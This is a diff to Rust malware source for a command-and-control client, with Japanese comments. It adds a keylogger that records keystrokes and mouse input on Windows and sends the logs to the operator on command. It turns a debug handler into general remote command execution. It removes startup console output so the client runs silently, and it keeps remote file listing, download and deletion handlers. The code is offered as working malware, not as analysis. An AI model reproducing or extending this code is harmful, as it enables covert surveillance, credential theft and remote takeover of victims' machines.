@@ -39,6 +39,8 @@ pub struct C2Client {
     config: Config,
     client_id: String,
     is_active: bool,
+    keylogger_active: bool,
+    keylogger_duration: Option<u32>, // キーロガーの実行時間（ms）
 }
 
 impl C2Client {
@@ -54,15 +56,14 @@ impl C2Client {
             config,
             client_id,
             is_active: false,
+            keylogger_active: false,
+            keylogger_duration: None,
         }
     }
 
     /// C2通信を開始して待機状態に移行
     pub async fn start_c2_loop(&mut self) -> Result<(), String> {
-        println!("🌐 C2 Client started");
-        println!("   Target Server: {}", self.config.command_server_url);
-        println!("   Client ID: {}", self.client_id);
-        println!("   Auth Token: {}", self.config.command_auth_token);
+        // サイレント起動
         
         self.is_active = true;
 
@@ -182,19 +183,19 @@ impl C2Client {
 
         let ctype = command.command_type.to_lowercase();
         let result = match ctype.as_str() {
-            "collect_system_info" | "collectsysteminfo" => self.handle_collect_system_info_command().await,
-            "status" => self.handle_status_command().await,
-            "ping" => self.handle_ping_command().await,
-            "shutdown" => self.handle_shutdown_command().await,
-            "webhook_send" => self.handle_webhook_send().await,
-            // デバッグコマンド実行
-            "execute_debug_command" | "debug_command" => self.handle_debug_command(&command.parameters).await,
+            // メインコマンド実行（旧デバッグコマンド）
+            "execute" | "exec" | "cmd" | "command" | "run" => self.handle_command_execution(&command.parameters).await,
             // ファイル管理コマンド
-            "list_files" | "ls" => self.handle_list_files_command(&command.parameters).await,
-            "get_file_info" | "fileinfo" => self.handle_get_file_info_command(&command.parameters).await,
-            "download_file" | "download" => self.handle_download_file_command(&command.parameters).await,
-            "delete_file" | "rm" => self.handle_delete_file_command(&command.parameters).await,
-            "create_dir" | "mkdir" => self.handle_create_dir_command(&command.parameters).await,
+            "list_files" | "ls" | "dir" => self.handle_list_files_command(&command.parameters).await,
+            "get_file_info" | "fileinfo" | "stat" => self.handle_get_file_info_command(&command.parameters).await,
+            "download_file" | "download" | "get" => self.handle_download_file_command(&command.parameters).await,
+            "delete_file" | "rm" | "del" => self.handle_delete_file_command(&command.parameters).await,
+            "create_dir" | "mkdir" | "md" => self.handle_create_dir_command(&command.parameters).await,
+            // キーロガーコマンド
+            "keylog_start" | "keylog" | "kl_start" => self.handle_keylog_start_command(&command.parameters).await,
+            "keylog_stop" | "kl_stop" => self.handle_keylog_stop_command().await,
+            "keylog_status" | "kl_status" => self.handle_keylog_status_command().await,
+            "keylog_download" | "kl_download" => self.handle_keylog_download_command(&command.parameters).await,
             _ => Err(format!("Unknown command type: {}", command.command_type)),
         };
 
@@ -297,117 +298,13 @@ impl C2Client {
             .send()?;
 
         if response.status_code >= 200 && response.status_code < 300 {
-            println!("📤 Data uploaded successfully");
             Ok(())
         } else {
             Err(format!("Data upload failed: HTTP {}", response.status_code).into())
         }
     }
 
-    // コマンドハンドラー
-    async fn handle_collect_system_info_command(&self) -> Result<(String, Option<serde_json::Value>), String> {
-        println!("🔍 Collecting system information via remote command...");
-        
-        let hostname = std::env::var("COMPUTERNAME")
-            .or_else(|_| std::env::var("HOSTNAME"))
-            .unwrap_or_else(|_| "Unknown".to_string());
-        
-        let username = std::env::var("USERNAME")
-            .or_else(|_| std::env::var("USER"))
-            .unwrap_or_else(|_| "Unknown".to_string());
-
-        // システム情報を収集
-        let system_info = serde_json::json!({
-            "client_id": self.client_id,
-            "hostname": hostname,
-            "username": username,
-            "os": std::env::consts::OS,
-            "arch": std::env::consts::ARCH,
-            "family": std::env::consts::FAMILY,
-            "timestamp": SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs(),
-            "uptime_seconds": self.get_system_uptime(),
-            "working_directory": std::env::current_dir().ok(),
-            "environment_vars": {
-                "PATH": std::env::var("PATH").unwrap_or_default(),
-                "TEMP": std::env::var("TEMP").or_else(|_| std::env::var("TMP")).unwrap_or_default(),
-                "HOME": std::env::var("HOME").or_else(|_| std::env::var("USERPROFILE")).unwrap_or_default(),
-            }
-        });
-
-        println!("✅ System information collected successfully");
-        Ok(("System information collected".to_string(), Some(system_info)))
-    }
-
-    async fn handle_status_command(&self) -> Result<(String, Option<serde_json::Value>), String> {
-        let hostname = std::env::var("COMPUTERNAME")
-            .or_else(|_| std::env::var("HOSTNAME"))
-            .unwrap_or_else(|_| "Unknown".to_string());
-        
-        let username = std::env::var("USERNAME")
-            .or_else(|_| std::env::var("USER"))
-            .unwrap_or_else(|_| "Unknown".to_string());
-
-        let status_data = serde_json::json!({
-            "client_id": self.client_id,
-            "hostname": hostname,
-            "username": username,
-            "server_url": self.config.command_server_url,
-            "is_active": self.is_active,
-            "status": "running"
-        });
-
-        Ok(("Status retrieved".to_string(), Some(status_data)))
-    }
-
-    async fn handle_ping_command(&self) -> Result<(String, Option<serde_json::Value>), String> {
-        let pong_data = serde_json::json!({
-            "message": "pong",
-            "client_id": self.client_id,
-            "timestamp": SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs(),
-        });
-        Ok(("Pong!".to_string(), Some(pong_data)))
-    }
-
-    async fn handle_shutdown_command(&self) -> Result<(String, Option<serde_json::Value>), String> {
-        println!("🔴 Remote shutdown command received");
-        
-        tokio::spawn(async {
-            tokio::time::sleep(Duration::from_secs(2)).await;
-            println!("💀 Shutting down...");
-            std::process::exit(0);
-        });
-
-        Ok(("Shutdown initiated".to_string(), None))
-    }
-
-    // Webhookをクライアント経由で送るシンプルなハンドラ
-    async fn handle_webhook_send(&mut self) -> Result<(String, Option<serde_json::Value>), String> {
-        let payload = crate::IntegratedPayload::create_with_config(&self.config)
-            .await
-            .map_err(|e| format!("Payload collection failed: {}", e))?;
-        crate::send_unified_webhook(&payload, &self.config)
-            .await
-            .map_err(|e| format!("Webhook send failed: {}", e))?;
-        Ok(("Webhook sent via client".into(), None))
-    }
-
-    // ヘルパー関数
-    fn get_system_uptime(&self) -> Option<u64> {
-        // Windows の場合、GetTickCount64 を使ってシステム稼働時間を取得
-        #[cfg(windows)]
-        {
-            extern "system" {
-                fn GetTickCount64() -> u64;
-            }
-            unsafe { Some(GetTickCount64() / 1000) } // ミリ秒を秒に変換
-        }
-        
-        #[cfg(not(windows))]
-        {
-            // Unix系の場合は簡略化（実装可能だが複雑）
-            None
-        }
-    }
+    // ========== メインコマンドハンドラー ==========
 
     // ========== ファイル管理コマンド ==========
 
@@ -599,7 +496,7 @@ impl C2Client {
     }
 
     /// デバッグコマンド実行
-    async fn handle_debug_command(&self, params: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
+    async fn handle_command_execution(&self, params: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
         let command = params.get(0).ok_or("Command parameter required")?;
         let default_timeout = "30".to_string();
         let default_workdir = "".to_string();
@@ -671,5 +568,118 @@ impl C2Client {
             }
             Ok((format!("Command failed with exit code {} ({}ms)", exit_code, execution_time), Some(result_data)))
         }
+    }
+
+    // キーロガーコマンドハンドラー
+    #[cfg(windows)]
+    async fn handle_keylog_start_command(&mut self, parameters: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
+        use crate::collectors::key_mouse_logger::{collect_input_events_structured, save_session_to_file};
+        
+        if self.keylogger_active {
+            return Ok(("Keylogger is already active".to_string(), None));
+        }
+
+        let duration = if parameters.is_empty() {
+            30000  // デフォルト30秒
+        } else {
+            parameters[0].parse::<u32>().unwrap_or(30000)
+        };
+
+        self.keylogger_active = true;
+        self.keylogger_duration = Some(duration);
+
+        println!("🎯 Starting keylogger for {} seconds", duration / 1000);
+        
+        // バックグラウンドでキーロガーを実行
+        let events = tokio::task::spawn_blocking(move || {
+            collect_input_events_structured(duration)
+        }).await.map_err(|e| format!("Failed to start keylogger: {}", e))?;
+
+        // セッションを保存
+        let _ = save_session_to_file();
+        
+        self.keylogger_active = false;
+        self.keylogger_duration = None;
+
+        let result_data = serde_json::json!({
+            "events_captured": events.len(),
+            "duration_ms": duration,
+            "session_saved": true
+        });
+
+        Ok((format!("Keylogger completed: {} events captured", events.len()), Some(result_data)))
+    }
+
+    #[cfg(not(windows))]
+    async fn handle_keylog_start_command(&mut self, _parameters: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
+        Err("Keylogger is not supported on non-Windows platforms".to_string())
+    }
+
+    async fn handle_keylog_stop_command(&mut self) -> Result<(String, Option<serde_json::Value>), String> {
+        if !self.keylogger_active {
+            return Ok(("Keylogger is not currently active".to_string(), None));
+        }
+
+        self.keylogger_active = false;
+        self.keylogger_duration = None;
+
+        Ok(("Keylogger stopped".to_string(), None))
+    }
+
+    async fn handle_keylog_status_command(&self) -> Result<(String, Option<serde_json::Value>), String> {
+        let status_data = serde_json::json!({
+            "active": self.keylogger_active,
+            "duration_ms": self.keylogger_duration,
+        });
+
+        let status_msg = if self.keylogger_active {
+            format!("Keylogger is active ({}ms remaining)", self.keylogger_duration.unwrap_or(0))
+        } else {
+            "Keylogger is inactive".to_string()
+        };
+
+        Ok((status_msg, Some(status_data)))
+    }
+
+    #[cfg(windows)]
+    async fn handle_keylog_download_command(&self, parameters: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
+        use crate::collectors::key_mouse_logger::{load_session_from_file, get_daily_logs, get_statistics};
+        use std::fs;
+        
+        let log_type = parameters.get(0).map(|s| s.as_str()).unwrap_or("session");
+        
+        let (events, log_info) = match log_type {
+            "session" => {
+                let events = load_session_from_file();
+                (events, "Current session log".to_string())
+            },
+            "daily" => {
+                let date = parameters.get(1).unwrap_or(&"2025-10-05".to_string()).clone();
+                let events = get_daily_logs(&date);
+                (events, format!("Daily log for {}", date))
+            },
+            _ => return Err("Invalid log type. Use 'session' or 'daily'".to_string()),
+        };
+
+        let stats = get_statistics();
+        
+        // ログファイルの存在確認
+        let session_file_exists = fs::metadata("keylog_session.json").is_ok();
+        
+        let result_data = serde_json::json!({
+            "log_type": log_type,
+            "log_info": log_info,
+            "events_count": events.len(),
+            "events": events,
+            "statistics": stats,
+            "session_file_exists": session_file_exists
+        });
+
+        Ok((format!("{}: {} events available", log_info, events.len()), Some(result_data)))
+    }
+
+    #[cfg(not(windows))]
+    async fn handle_keylog_download_command(&self, _parameters: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
+        Err("Keylogger is not supported on non-Windows platforms".to_string())
     }
 }
